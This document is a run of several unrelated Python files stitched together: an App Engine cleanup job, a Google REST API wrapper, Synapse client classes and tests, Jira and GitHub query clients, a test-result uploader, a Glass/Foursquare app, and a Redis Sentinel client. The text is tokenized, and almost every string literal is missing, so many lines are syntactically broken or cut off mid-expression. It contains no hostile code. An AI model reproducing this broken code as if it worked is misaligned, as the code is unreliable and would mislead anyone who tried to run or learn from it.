# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, \n 
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE \n 
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER \n 
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, \n 
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN \n 
# THE SOFTWARE. \n 
\n 
~~ ~~ import datetime \n 
\n 
from google . appengine . ext import db , webapp \n 
from google . appengine . ext . webapp import util \n 
\n 
import member \n 
\n 
\n 
# import connection \n 
class CleanUp ( webapp . RequestHandler ) : \n 
\n 
~~~ def get ( self ) : \n 
\n 
# execute only when request comes from appengine.com         \n 
~~~ if self . request . headers . get ( ) == : \n 
\n 
~~~ now = datetime . datetime . now ( ) \n 
\n 
# exchange life cycle reasonably limited to 10 minutes, as depends on user confirmation \n 
deltaMem = datetime . timedelta ( seconds = 600 ) # 10 minutes \n 
thenMem = now - deltaMem \n 
query = db . Query ( member . Member ) . filter ( , thenMem ) \n 
mems = [ ] \n 
for m in query : \n 
~~~ mems . append ( m ) \n 
\n 
~~ db . delete ( mems ) \n 
\n 
\n 
~~ ~~ ~~ def main ( ) : \n 
~~~ application = webapp . WSGIApplication ( [ ( , CleanUp ) ] , \n 
debug = True ) \n 
util . run_wsgi_app ( application ) \n 
\n 
\n 
~~ if __name__ == : \n 
~~~ main ( ) \n 
# Copyright 2012 Google Inc. All Rights Reserved. \n 
# \n 
# Licensed under the Apache License, Version 2.0 (the "License"); \n 
# you may not use this file except in compliance with the License. \n 
# You may obtain a copy of the License at \n 
# \n 
#    http://www.apache.org/licenses/LICENSE-2.0 \n 
# \n 
# Unless required by applicable law or agreed to in writing, \n 
# software distributed under the License is distributed on an \n 
# "AS IS" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, \n 
# either express or implied. See the License for the specific \n 
# language governing permissions and limitations under the License. \n 
\n 
~~ """Base and helper classes for Google RESTful APIs.""" \n 
\n 
\n 
\n 
\n 
\n 
__all__ = [ ] \n 
\n 
import logging \n 
import os \n 
import random \n 
import time \n 
\n 
from . import api_utils \n 
\n 
try : \n 
~~~ from google . appengine . api import app_identity \n 
from google . appengine . ext import ndb \n 
~~ except ImportError : \n 
~~~ from google . appengine . api import app_identity \n 
from google . appengine . ext import ndb \n 
\n 
\n 
\n 
~~ def _make_sync_method ( name ) : \n 
~~~ """Helper to synthesize a synchronous method from an async method name.\n\n  Used by the @add_sync_methods class decorator below.\n\n  Args:\n    name: The name of the synchronous method.\n\n  Returns:\n    A method (with first argument \'self\') that retrieves and calls\n    self.<name>, passing its own arguments, expects it to return a\n    Future, and then waits for and returns that Future\'s result.\n  """ \n 
\n 
def sync_wrapper ( self , * args , ** kwds ) : \n 
~~~ method = getattr ( self , name ) \n 
future = method ( * args , ** kwds ) \n 
return future . get_result ( ) \n 
\n 
~~ return sync_wrapper \n 
\n 
\n 
~~ def add_sync_methods ( cls ) : \n 
~~~ """Class decorator to add synchronous methods corresponding to async methods.\n\n  This modifies the class in place, adding additional methods to it.\n  If a synchronous method of a given name already exists it is not\n  replaced.\n\n  Args:\n    cls: A class.\n\n  Returns:\n    The same class, modified in place.\n  """ \n 
for name in cls . __dict__ . keys ( ) : \n 
~~~ if name . endswith ( ) : \n 
~~~ sync_name = name [ : - 6 ] \n 
if not hasattr ( cls , sync_name ) : \n 
~~~ setattr ( cls , sync_name , _make_sync_method ( name ) ) \n 
~~ ~~ ~~ return cls \n 
\n 
\n 
~~ class _AE_TokenStorage_ ( ndb . Model ) : \n 
~~~ """Entity to store app_identity tokens in memcache.""" \n 
\n 
token = ndb . StringProperty ( ) \n 
expires = ndb . FloatProperty ( ) \n 
\n 
\n 
~~ @ ndb . tasklet \n 
def _make_token_async ( scopes , service_account_id ) : \n 
~~~ """Get a fresh authentication token.\n\n  Args:\n    scopes: A list of scopes.\n    service_account_id: Internal-use only.\n\n  Raises:\n    An ndb.Return with a tuple (token, expiration_time) where expiration_time is\n    seconds since the epoch.\n  """ \n 
rpc = app_identity . create_rpc ( ) \n 
app_identity . make_get_access_token_call ( rpc , scopes , service_account_id ) \n 
token , expires_at = yield rpc \n 
raise ndb . Return ( ( token , expires_at ) ) \n 
\n 
\n 
~~ class _RestApi ( object ) : \n 
~~~ """Base class for REST-based API wrapper classes.\n\n  This class manages authentication tokens and request retries.  All\n  APIs are available as synchronous and async methods; synchronous\n  methods are synthesized from async ones by the add_sync_methods()\n  function in this module.\n\n  WARNING: Do NOT directly use this api. It\'s an implementation detail\n  and is subject to change at any release.\n  """ \n 
\n 
def __init__ ( self , scopes , service_account_id = None , token_maker = None , \n 
retry_params = None ) : \n 
~~~ """Constructor.\n\n    Args:\n      scopes: A scope or a list of scopes.\n      service_account_id: Internal use only.\n      token_maker: An asynchronous function of the form\n        (scopes, service_account_id) -> (token, expires).\n      retry_params: An instance of api_utils.RetryParams. If None, the\n        default for current thread will be used.\n    """ \n 
\n 
if isinstance ( scopes , basestring ) : \n 
~~~ scopes = [ scopes ] \n 
~~ self . scopes = scopes \n 
self . service_account_id = service_account_id \n 
self . make_token_async = token_maker or _make_token_async \n 
if not retry_params : \n 
~~~ retry_params = api_utils . _get_default_retry_params ( ) \n 
~~ self . retry_params = retry_params \n 
self . user_agent = { : retry_params . _user_agent } \n 
self . expiration_headroom = random . randint ( 60 , 240 ) \n 
\n 
~~ def __getstate__ ( self ) : \n 
~~~ """Store state as part of serialization/pickling.""" \n 
return { : self . scopes , \n 
: self . service_account_id , \n 
: ( None if self . make_token_async == _make_token_async \n 
else self . make_token_async ) , \n 
: self . retry_params , \n 
: self . expiration_headroom } \n 
\n 
~~ def __setstate__ ( self , state ) : \n 
~~~ """Restore state as part of deserialization/unpickling.""" \n 
self . __init__ ( state [ ] , \n 
service_account_id = state [ ] , \n 
token_maker = state [ ] , \n 
retry_params = state [ ] ) \n 
self . expiration_headroom = state [ ] \n 
\n 
~~ @ ndb . tasklet \n 
def do_request_async ( self , url , method = , headers = None , payload = None , \n 
deadline = None , callback = None ) : \n 
~~~ """Issue one HTTP request.\n\n    It performs async retries using tasklets.\n\n    Args:\n      url: the url to fetch.\n      method: the method in which to fetch.\n      headers: the http headers.\n      payload: the data to submit in the fetch.\n      deadline: the deadline in which to make the call.\n      callback: the call to make once completed.\n\n    Yields:\n      The async fetch of the url.\n    """ \n 
retry_wrapper = api_utils . _RetryWrapper ( \n 
self . retry_params , \n 
retriable_exceptions = api_utils . _RETRIABLE_EXCEPTIONS , \n 
should_retry = api_utils . _should_retry ) \n 
resp = yield retry_wrapper . run ( \n 
self . urlfetch_async , \n 
url = url , \n 
method = method , \n 
headers = headers , \n 
payload = payload , \n 
deadline = deadline , \n 
callback = callback , \n 
follow_redirects = False ) \n 
raise ndb . Return ( ( resp . status_code , resp . headers , resp . content ) ) \n 
\n 
~~ @ ndb . tasklet \n 
def get_token_async ( self , refresh = False ) : \n 
~~~ """Get an authentication token.\n\n    The token is cached in memcache, keyed by the scopes argument.\n    Uses a random token expiration headroom value generated in the constructor\n    to eliminate a burst of GET_ACCESS_TOKEN API requests.\n\n    Args:\n      refresh: If True, ignore a cached token; default False.\n\n    Yields:\n      An authentication token. This token is guaranteed to be non-expired.\n    """ \n 
key = % ( self . service_account_id , . join ( self . scopes ) ) \n 
ts = yield _AE_TokenStorage_ . get_by_id_async ( \n 
key , use_cache = True , use_memcache = True , \n 
use_datastore = self . retry_params . save_access_token ) \n 
if refresh or ts is None or ts . expires < ( \n 
time . time ( ) + self . expiration_headroom ) : \n 
~~~ token , expires_at = yield self . make_token_async ( \n 
self . scopes , self . service_account_id ) \n 
timeout = int ( expires_at - time . time ( ) ) \n 
ts = _AE_TokenStorage_ ( id = key , token = token , expires = expires_at ) \n 
if timeout > 0 : \n 
~~~ yield ts . put_async ( memcache_timeout = timeout , \n 
use_datastore = self . retry_params . save_access_token , \n 
use_cache = True , use_memcache = True ) \n 
~~ ~~ raise ndb . Return ( ts . token ) \n 
\n 
~~ @ ndb . tasklet \n 
def urlfetch_async ( self , url , method = , headers = None , \n 
payload = None , deadline = None , callback = None , \n 
follow_redirects = False ) : \n 
~~~ """Make an async urlfetch() call.\n\n    This is an async wrapper around urlfetch(). It adds an authentication\n    header.\n\n    Args:\n      url: the url to fetch.\n      method: the method in which to fetch.\n      headers: the http headers.\n      payload: the data to submit in the fetch.\n      deadline: the deadline in which to make the call.\n      callback: the call to make once completed.\n      follow_redirects: whether or not to follow redirects.\n\n    Yields:\n      This returns a Future despite not being decorated with @ndb.tasklet!\n    """ \n 
headers = { } if headers is None else dict ( headers ) \n 
headers . update ( self . user_agent ) \n 
try : \n 
~~~ self . token = yield self . get_token_async ( ) \n 
~~ except app_identity . InternalError , e : \n 
~~~ if os . environ . get ( , ) . endswith ( ) : \n 
~~~ self . token = None \n 
logging . warning ( \n 
) \n 
~~ else : \n 
~~~ raise e \n 
~~ ~~ if self . token : \n 
~~~ headers [ ] = + self . token \n 
\n 
~~ deadline = deadline or self . retry_params . urlfetch_timeout \n 
\n 
ctx = ndb . get_context ( ) \n 
resp = yield ctx . urlfetch ( \n 
url , payload = payload , method = method , \n 
headers = headers , follow_redirects = follow_redirects , \n 
deadline = deadline , callback = callback ) \n 
raise ndb . Return ( resp ) \n 
\n 
\n 
~~ ~~ _RestApi = add_sync_methods ( _RestApi ) \n 
from __future__ import absolute_import \n 
from __future__ import division \n 
from __future__ import print_function \n 
from __future__ import unicode_literals \n 
\n 
from . dict_object import DictObject \n 
\n 
class UserProfile ( DictObject ) : \n 
~~~ def __init__ ( self , ** kwargs ) : \n 
~~~ super ( UserProfile , self ) . __init__ ( kwargs ) \n 
\n 
\n 
~~ ~~ class UserGroupHeader ( DictObject ) : \n 
~~~ def __init__ ( self , ** kwargs ) : \n 
~~~ super ( UserGroupHeader , self ) . __init__ ( kwargs ) \n 
\n 
~~ ~~ class Team ( DictObject ) : \n 
~~~ """\n    Represent a `Synapse Team <http://rest.synapse.org/org/sagebionetworks/repo/model/Team.html>`_. User definable fields are:\n    :param icon:          fileHandleId for icon image of the Team\n    :param description:   A short description of this Team.\n    :param name:          The name of the Team.\n    :param canPublicJoin: true for teams which members can join without an invitation or approval\n    """ \n 
def __init__ ( self , ** kwargs ) : \n 
~~~ super ( Team , self ) . __init__ ( kwargs ) \n 
\n 
~~ @ classmethod \n 
def getURI ( cls , id ) : \n 
~~~ return % id \n 
\n 
~~ def postURI ( self ) : \n 
~~~ return \n 
\n 
~~ def putURI ( self ) : \n 
~~~ return \n 
\n 
~~ def deleteURI ( self ) : \n 
~~~ return % self . id \n 
\n 
~~ def getACLURI ( self ) : \n 
~~~ return % self . id \n 
\n 
~~ def putACLURI ( self ) : \n 
~~~ return \n 
\n 
\n 
~~ ~~ class TeamMember ( DictObject ) : \n 
~~~ def __init__ ( self , ** kwargs ) : \n 
~~~ if in kwargs : \n 
~~~ kwargs [ ] = UserGroupHeader ( ** kwargs [ ] ) \n 
~~ super ( TeamMember , self ) . __init__ ( kwargs ) \n 
\n 
~~ ~~ from nose . tools import assert_raises \n 
\n 
from synapseclient . evaluation import Evaluation , Submission \n 
\n 
def test_Evaluation ( ) : \n 
~~~ """Test the construction and accessors of Evaluation objects.""" \n 
\n 
\n 
assert_raises ( ValueError , Evaluation , name = , description = , status = ) \n 
assert_raises ( ValueError , Evaluation , name = , description = , status = , contentSource \n 
\n 
#Assert that the values are  \n 
ev = Evaluation ( name = , description = , status = , contentSource = ) \n 
assert ( ev [ ] == ev . name ) \n 
assert ( ev [ ] == ev . description ) \n 
assert ( ev [ ] == ev . status ) \n 
\n 
\n 
~~ def test_Submission ( ) : \n 
~~~ """Test the construction and accessors of Evaluation objects.""" \n 
\n 
assert_raises ( KeyError , Submission , foo = ) \n 
\n 
\n 
~~ \'\'\'\nCopyright (c) 2015, Salesforce.com, Inc.\nAll rights reserved.\n\nRedistribution and use in source and binary forms, with or without modification, are permitted provided that the following conditions are met:\n\n* Redistributions of source code must retain the above copyright notice, this list of conditions and the following disclaimer.\n\n* Redistributions in binary form must reproduce the above copyright notice, this list of conditions and the following disclaimer in the documentation and/or other materials provided with the distribution.\n\n* Neither the name of Salesforce.com nor the names of its contributors may be used to endorse or promote products derived from this software without specific prior written permission.\n\nTHIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.\n\'\'\' \n 
\n 
"""\nJiraAPI - Sends JQL (Jira Query Language) requests to a Jira instance and returns the results\n""" \n 
import ssl \n 
\n 
import requests \n 
import json \n 
import urllib \n 
import os \n 
\n 
__copyright__ = "2015 Salesforce.com, Inc" \n 
__status__ = "Prototype" \n 
\n 
\n 
class JiraAPI ( object ) : \n 
~~~ def __init__ ( self , server , credentials ) : \n 
~~~ super ( JiraAPI , self ) . __init__ ( ) \n 
self . server = server \n 
self . credentials = credentials \n 
self . verify = None \n 
__location__ = os . path . realpath ( os . path . join ( os . getcwd ( ) , os . path . dirname ( __file__ ) ) ) \n 
if ( self . server == "jira.exacttarget.com:8443" ) : \n 
~~~ self . verify = os . path . join ( __location__ , ) \n 
\n 
~~ ~~ def fetchCommitDetails ( self , url ) : \n 
~~~ r = requests . get ( url , auth = self . auth ( ) , verify = self . verify ) ; \n 
if r . headers [ ] : \n 
~~~ remaining_requests = int ( r . headers [ ] ) \n 
if ( remaining_requests == 0 ) : \n 
~~~ self . _no_more_requests_until = datetime . datetime . fromtimestamp ( float ( r . headers [ \n 
return None \n 
~~ ~~ if ( r . ok ) : \n 
~~~ return r . json ( ) \n 
~~ return None \n 
\n 
~~ def jql ( self , query , offset = None ) : \n 
~~~ verbose = False \n 
resource_name = "search" \n 
url = "https://%s/rest/api/latest/%s" % ( self . server , urllib . quote ( resource_name ) ) \n 
params = { "jql" : query } \n 
if offset is not None : \n 
~~~ params [ "startAt" ] = offset \n 
~~ r = requests . get ( url , params = params , headers = { "Authorization" : self . credentials . authorizationHeaderValue if ( r . ok ) : \n 
~~~ results = r . json ( ) \n 
return results \n 
~~ else : \n 
~~~ print "Request failed: " , r . status_code \n 
print r . text \n 
~~ return None \n 
\n 
~~ ~~ if __name__ == : \n 
~~~ usercredentials_jsonfile = "bugsystems-Jira-usercreds.json" \n 
user_creds_data = open ( usercredentials_jsonfile ) \n 
user_creds = json . load ( user_creds_data ) \n 
user = user_creds [ "user" ] \n 
password = user_creds [ "token" ] \n 
server_url = \n 
jira = JiraAPI ( server_url , user , password ) \n 
results = jira . jql ( \'issuetype = Bug AND labels = trust AND status in (Accepted, "In Progress", Reopened, QA, "Needs Documentation", "On Hold", "QA Confirmed", Backlog, "Under Consideration", Investigation, "Define User Requirements", "Interaction Design", "Ready for Engineering", "UX Review", Done, "In Review", Blocked)\' ~~ \'\'\'\nCopyright (c) 2015, Salesforce.com, Inc.\nAll rights reserved.\n\nRedistribution and use in source and binary forms, with or without modification, are permitted provided that the following conditions are met:\n\n* Redistributions of source code must retain the above copyright notice, this list of conditions and the following disclaimer.\n\n* Redistributions in binary form must reproduce the above copyright notice, this list of conditions and the following disclaimer in the documentation and/or other materials provided with the distribution.\n\n* Neither the name of Salesforce.com nor the names of its contributors may be used to endorse or promote products derived from this software without specific prior written permission.\n\nTHIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.\n\'\'\' \n 
\n 
import requests \n 
import json \n 
import datetime \n 
import dateutil . parser \n 
import urllib \n 
import os \n 
import pytz \n 
\n 
from Empire . cloudservices . github import GithubOrg , GithubRepo , GithubCommit \n 
from repos . base import RepoSource , RepoCommit , RepoPatch \n 
from repos . diffparser import DiffParser \n 
import logging \n 
logger = logging . getLogger ( ) \n 
\n 
owner = \n 
repo = \n 
\n 
class GithubSource ( RepoSource ) : \n 
~~~ def __init__ ( self , creds = None , host = , owner = , repo = ) : \n 
~~~ self . _last_date = None \n 
self . _last_identifier = None \n 
self . _no_more_requests_until = None \n 
github_org = GithubOrg ( host , owner , creds ) \n 
self . _github_repo = GithubRepo ( github_org , repo ) \n 
\n 
~~ def processSinceIdentifier ( self , identifier , commit_started_callback , patch_callback , commit_finished_callback ~~~ since_datetime = datetime . datetime . utcnow ( ) \n 
since_datetime = since_datetime . replace ( tzinfo = pytz . UTC , hour = 0 , minute = 0 , second = 0 ) \n 
if identifier : \n 
~~~ try : \n 
~~~ since_datetime = dateutil . parser . parse ( identifier ) \n 
~~ except Exception as e : \n 
~~~ logger . error ( "Error parsing datetime from %s" , identifier ) \n 
~~ ~~ commits = self . _github_repo . commits ( since_datetime , path = path ) \n 
self . processCommits ( commits , \n 
commit_started_callback = commit_started_callback , \n 
patch_callback = patch_callback , \n 
commit_finished_callback = commit_finished_callback ) ; \n 
if self . _last_date : \n 
~~~ return self . _last_date . isoformat ( ) \n 
~~ if since_datetime : \n 
~~~ return since_datetime . isoformat ( ) \n 
~~ return None \n 
\n 
~~ def processCommits ( self , commits , commit_started_callback , patch_callback , commit_finished_callback ~~~ if commits is None : \n 
~~~ return None \n 
\n 
# Process oldest first \n 
~~ commits = commits [ : : - 1 ] \n 
logger . debug ( "process %d commits" , len ( commits ) ) \n 
for github_commit in commits : \n 
~~~ logger . debug ( "sha: %s" , github_commit . sha ) \n 
if github_commit . sha : \n 
~~~ github_commit = self . _github_repo . commit ( github_commit . sha ) \n 
\n 
repo_commit = RepoCommit ( ) ; \n 
repo_commit . url = github_commit . html_url \n 
repo_commit . repo_source = self \n 
\n 
if github_commit . date is not None : \n 
~~~ self . _last_date = dateutil . parser . parse ( github_commit . date ) \n 
\n 
repo_commit . date = self . _last_date \n 
self . _last_date += datetime . timedelta ( seconds = 1 ) \n 
repo_commit . identifier = self . _last_date . isoformat ( ) \n 
\n 
repo_commit . committer_email = github_commit . committer_email \n 
repo_commit . committer_name = github_commit . committer_name \n 
repo_commit . username = github_commit . committer_login \n 
repo_commit . message = github_commit . message \n 
\n 
repo_commit . sha = github_commit . sha \n 
commit_started_callback ( repo_commit ) \n 
\n 
if github_commit . files : \n 
~~~ for file_info in github_commit . files : \n 
~~~ if file_info . get ( ) : \n 
~~~ filename = committer_username = None \n 
diff = DiffParser ( file_info [ ] ) \n 
repo_patch = RepoPatch ( repo_commit = repo_commit ) \n 
repo_patch . diff = diff \n 
repo_patch . filename = file_info . get ( "filename" ) \n 
patch_callback ( repo_patch ) \n 
\n 
~~ ~~ ~~ commit_finished_callback ( repo_commit ) \n 
logger . debug ( "batch fof files processed" ) \n 
~~ ~~ ~~ logger . debug ( "done" ) \n 
\n 
\n 
~~ ~~ if __name__ == "__main__" : \n 
~~~ from Empire . creds import CredentialManager \n 
credentials_file = "credentials.json" \n 
credential_key = os . environ . get ( ) \n 
if credential_key is None : \n 
~~~ credential_key = getpass . getpass ( ) \n 
~~ credential_manager = CredentialManager ( credentials_file , credential_key ) \n 
creds = credential_manager . get_or_create_credentials_for ( "github-mfeldmansf" , "password" ) \n 
\n 
test = GithubSource ( creds ) ; \n 
def cstart ( commit ) : \n 
~~~ print commit \n 
~~ def pstart ( patch ) : \n 
~~~ print "touched " , patch . filename \n 
~~ def cend ( commit ) : \n 
~~~ pass \n 
~~ test . processSinceIdentifier ( "2014-11-12T00:00:00Z" , cstart , pstart , cend ) ; \n 
~~ import json \n 
import os \n 
import sys \n 
import requests \n 
\n 
def upload_test_results ( ) : \n 
~~~ APEXTESTSDB_BASE_URL = os . environ . get ( ) \n 
APEXTESTSDB_USER_ID = os . environ . get ( ) \n 
APEXTESTSDB_TOKEN = os . environ . get ( ) \n 
\n 
PACKAGE = os . environ . get ( ) \n 
REPOSITORY_URL = os . environ . get ( ) \n 
BRANCH_NAME = os . environ . get ( ) \n 
COMMIT_SHA = os . environ . get ( ) \n 
EXECUTION_NAME = os . environ . get ( ) \n 
EXECUTION_URL = os . environ . get ( ) \n 
RESULTS_FILE_URL = os . environ . get ( ) \n 
ENVIRONMENT_NAME = os . environ . get ( ) \n 
\n 
payload = { \n 
: PACKAGE , \n 
: REPOSITORY_URL , \n 
: BRANCH_NAME , \n 
: COMMIT_SHA , \n 
: EXECUTION_NAME , \n 
: EXECUTION_URL , \n 
: ENVIRONMENT_NAME , \n 
: APEXTESTSDB_USER_ID , \n 
: APEXTESTSDB_TOKEN , \n 
: RESULTS_FILE_URL , \n 
} \n 
\n 
response = requests . post ( APEXTESTSDB_BASE_URL + , data = payload ) \n 
data = json . loads ( response . content ) \n 
return % ( APEXTESTSDB_BASE_URL , data [ ] ) \n 
\n 
~~ if __name__ == : \n 
~~~ try : \n 
~~~ execution_detail_url = upload_test_results ( ) \n 
print execution_detail_url \n 
~~ except : \n 
~~~ import traceback \n 
exc_type , exc_value , exc_traceback = sys . exc_info ( ) \n 
print * 60 \n 
traceback . print_exception ( exc_type , exc_value , exc_traceback , file = sys . stdout ) \n 
print * 60 \n 
sys . exit ( 1 ) \n 
# Python imports \n 
~~ ~~ from flask import request , session , render_template , redirect , url_for \n 
\n 
# Import glass library \n 
import glass \n 
\n 
# Import foursquare library \n 
import foursquare \n 
\n 
# Config imports \n 
import config \n 
\n 
app = glass . Application ( \n 
client_id = config . GOOGLE_CLIENT_ID , \n 
client_secret = config . GOOGLE_CLIENT_SECRET , \n 
scopes = config . GOOGLE_SCOPES , \n 
template_folder = "templates" , \n 
static_url_path = , \n 
static_folder = ) \n 
\n 
\n 
app . web . secret_key = \n 
\n 
# map of userGoogleToken -> userFoursquareToken \n 
FOURSQUARE_TOKENS = { } \n 
\n 
# Return basic foursquare client \n 
def foursquare_client ( ) : \n 
~~~ return foursquare . Foursquare ( client_id = config . FOURSQUARE_CLIENT_ID , client_secret = config . FOURSQUARE_CLIENT_SECRET \n 
~~ @ app . web . route ( "/" ) \n 
def index ( ) : \n 
~~~ return render_template ( "index.html" , auth = False ) \n 
\n 
~~ @ app . subscriptions . login \n 
def login ( user ) : \n 
~~~ print "google user: %s" % ( user . token ) \n 
session [ ] = user . token \n 
return redirect ( "/foursquare/authorize" ) \n 
\n 
~~ @ app . subscriptions . location \n 
def change_location ( user ) : \n 
# Get last known location \n 
~~~ location = user . location ( ) \n 
llat = location . get ( ) \n 
llong = location . get ( ) \n 
\n 
# Get foursquare client \n 
client = foursquare . Foursquare ( access_token = FOURSQUARE_TOKENS [ user . token ] ) \n 
\n 
# Search venues on Foursquare \n 
venues = client . venues . search ( params = { : llat + + llong , : location . get ( ) } ) \n 
if len ( venues [ ] ) > 0 : \n 
# Post card with result \n 
~~~ user . timeline . post_template ( "venue.html" , venue = venues [ ] [ 0 ] , llat = llat , llong = llong ) \n 
\n 
\n 
~~ ~~ @ app . web . route ( "/foursquare/authorize" ) \n 
def foursquare_authorize ( ) : \n 
~~~ client = foursquare_client ( ) \n 
return redirect ( client . oauth . auth_url ( ) ) \n 
\n 
~~ @ app . web . route ( "/foursquare/callback" ) \n 
def foursquare_callback ( ) : \n 
~~~ code = request . args . get ( , None ) \n 
client = foursquare_client ( ) \n 
\n 
if code is None or not in session : \n 
~~~ return render_template ( "index.html" , auth = False ) \n 
\n 
\n 
~~ access_token = client . oauth . get_token ( code ) \n 
\n 
# Add token to the map \n 
FOURSQUARE_TOKENS [ session [ ] ] = access_token \n 
\n 
# Apply the returned access token to the client \n 
client . set_access_token ( access_token ) \n 
\n 
\n 
user = client . users ( ) \n 
username = user [ ] [ ] \n 
\n 
print "foursquare user: %s" % ( access_token ) , username \n 
\n 
# Send a welcome message to the glass \n 
userglass = glass . User ( app = app , token = session [ ] ) \n 
userglass . timeline . post ( text = "Welcome %s!" % username ) \n 
\n 
return render_template ( "index.html" , auth = True ) \n 
\n 
\n 
~~ if __name__ == : \n 
~~~ print "Starting application at %s:%i" % ( config . HOST , config . PORT ) \n 
app . run ( port = config . PORT , host = config . HOST ) \n 
"""\nDistributed Redis Client\n\nThe DisredisClient class can be used in place of a StrictRedis client. Instead\nof passing the host and port in, pass in a list of Sentinel addresses in\nthe form of "host:port". It will connect to the first responding Sentinel\nand query it for masters that it knows about. These masters will become the\nnodes that are sharded across. As long as the number of masters does not\nchange, the sharding will be stable even if there is a node failure.\n\nNode failures are handled by asking the Sentinel for the updated master of\nthe given node. During the initial failure, some request may error out\nwith a ConnectionError if they are made between when the node fails and\nwhen Sentinel executes the fail-over procedure.\n\n""" \n 
\n 
~~ import logging \n 
from hashlib import sha1 \n 
from functools import wraps \n 
\n 
from redis . client import StrictRedis \n 
from redis . exceptions import ConnectionError \n 
\n 
\n 
class Node ( object ) : \n 
~~~ """\n    Represents a single master node in the Redis cluster.\n    """ \n 
redis_client_class = StrictRedis \n 
\n 
def __init__ ( self , name , host , port ) : \n 
~~~ self . name = name \n 
self . host = host \n 
self . port = port \n 
logger = logging . getLogger ( ) \n 
logger . info ( "Connecting to Redis master %s - %s:%s" % ( name , host , port ) ) \n 
self . connection = self . redis_client_class ( host , int ( port ) ) \n 
\n 
\n 
~~ ~~ def executeOnNode ( func ) : \n 
~~~ """\n    Decorator that will cause the function to be executed on the proper\n    redis node. In the case of a Connection failure, it will attempt to find\n    a new master node and perform the action there.\n    """ \n 
@ wraps ( func ) \n 
def wrapper ( self , key , * args , ** kwargs ) : \n 
~~~ node = self . get_node_for_key ( key ) \n 
nodeFunc = getattr ( node . connection , func . __name__ ) \n 
try : \n 
~~~ return nodeFunc ( key , * args , ** kwargs ) \n 
~~ except ConnectionError : \n 
\n 
# we have no choice but to fail for real. \n 
~~~ node = self . get_master ( node ) \n 
nodeFunc = getattr ( node . connection , func . __name__ ) \n 
return nodeFunc ( key , * args , ** kwargs ) \n 
~~ ~~ return wrapper \n 
\n 
\n 
~~ class DisredisClient ( object ) : \n 
~~~ """\n    StrictRedis-compatible client object for a cluster of redis servers. The\n    constructor takes a list of Sentinel addresses in the form of "host:port".\n    Redis master nodes will be obtained from the Sentinels.\n    """ \n 
redis_client_class = StrictRedis \n 
sentinel = None \n 
nodes = None \n 
\n 
def __init__ ( self , sentinel_addresses ) : \n 
~~~ self . sentinel_addresses = sentinel_addresses \n 
self . _get_nodes ( ) \n 
\n 
~~ def _connect ( self ) : \n 
~~~ """\n        Connect to a sentinel, accounting for sentinels that fail.\n        """ \n 
while True : \n 
~~~ try : \n 
~~~ address = self . sentinel_addresses . pop ( 0 ) \n 
logger = logging . getLogger ( ) \n 
logger . info ( "Connecting to Sentinel %s" % address ) \n 
host , port = address . split ( ":" ) \n 
self . sentinel = self . redis_client_class ( host , int ( port ) ) \n 
self . sentinel_addresses . append ( address ) \n 
break \n 
~~ except ConnectionError : \n 
~~~ if not self . sentinel_addresses : \n 
~~~ raise \n 
~~ ~~ except IndexError : \n 
~~~ raise ConnectionError ( "Out of available Sentinel addresses!" ) \n 
\n 
~~ ~~ ~~ def _execute_sentinel_command ( self , * args , ** kwargs ) : \n 
~~~ """\n        Run a command on a sentinel, but fail over to the next sentinel in the\n        list if there\'s a connection problem.\n        """ \n 
while True : \n 
~~~ try : \n 
~~~ if self . sentinel is None : \n 
~~~ self . _connect ( ) \n 
~~ return self . sentinel . execute_command ( "SENTINEL" , * args , \n 
** kwargs ) \n 
~~ except ConnectionError : \n 
~~~ self . sentinel = None \n 
if self . sentinel_addresses : \n 
~~~ self . sentinel_addresses . pop ( ) # pull the current connection off \n 
~~ else : \n 
~~~ raise \n 
\n 
~~ ~~ ~~ ~~ def _get_nodes ( self ) : \n 
~~~ """\n        Retrieve the list of nodes and their masters from the Sentinel server.\n        """ \n 
masterList = self . _execute_sentinel_command ( "MASTERS" ) \n 
self . nodes = [ ] \n 
for master in masterList : \n 
~~~ info = dict ( zip ( master [ : : 2 ] , master [ 1 : : 2 ] ) ) \n 
